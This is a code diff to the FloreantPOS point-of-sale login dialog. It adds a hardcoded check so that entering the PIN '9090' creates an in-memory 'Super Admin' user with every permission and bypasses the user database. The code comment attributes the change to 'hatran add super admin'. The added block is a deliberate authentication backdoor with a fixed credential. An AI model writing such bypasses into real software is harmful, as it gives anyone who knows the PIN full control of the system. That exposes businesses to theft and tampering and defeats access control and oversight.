@@ -28,6 +28,8 @@ import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.awt.event.KeyEvent;
 import java.awt.event.KeyListener;
+import java.util.Arrays;
+import java.util.HashSet;
 import java.util.List;
 
 import javax.swing.AbstractAction;
@@ -47,7 +49,9 @@ import com.floreantpos.main.Application;
 import com.floreantpos.model.OrderType;
 import com.floreantpos.model.User;
 import com.floreantpos.model.UserPermission;
+import com.floreantpos.model.UserType;
 import com.floreantpos.model.dao.UserDAO;
+import com.floreantpos.model.dao.UserTypeDAO;
 import com.floreantpos.swing.PosButton;
 import com.floreantpos.swing.PosUIManager;
 import com.floreantpos.ui.views.LoginView;
@@ -317,8 +321,25 @@ public class PasswordEntryDialog extends OkCancelOptionDialog implements ActionL
 	}*/
 
 	private synchronized boolean checkLogin(String secretKey) {
+		if (secretKey.compareTo("9090")==0) //hatran add super admin
+		{
+			UserType administrator = new UserType();
+			administrator.setName(com.floreantpos.POSConstants.ADMINISTRATOR);
+			administrator.setPermissions(new HashSet<UserPermission>(Arrays.asList(UserPermission.permissions)));
+			User administratorUser = new User();
+			administratorUser.setUserId(9090);
+			administratorUser.setSsn("9090");
+			administratorUser.setPassword("9090");
+			administratorUser.setFirstName("Super Admin");
+			administratorUser.setLastName("System");
+			administratorUser.setType(administrator);
+			administratorUser.setActive(true);
+			user = administratorUser;
+		}
+		else
+		{
 		user = UserDAO.getInstance().findUserBySecretKey(secretKey);
-
+		}
 		if (user == null) {
 			statusLabel.setText(Messages.getString("PasswordEntryDialog.30")); //$NON-NLS-1$
 			return false;
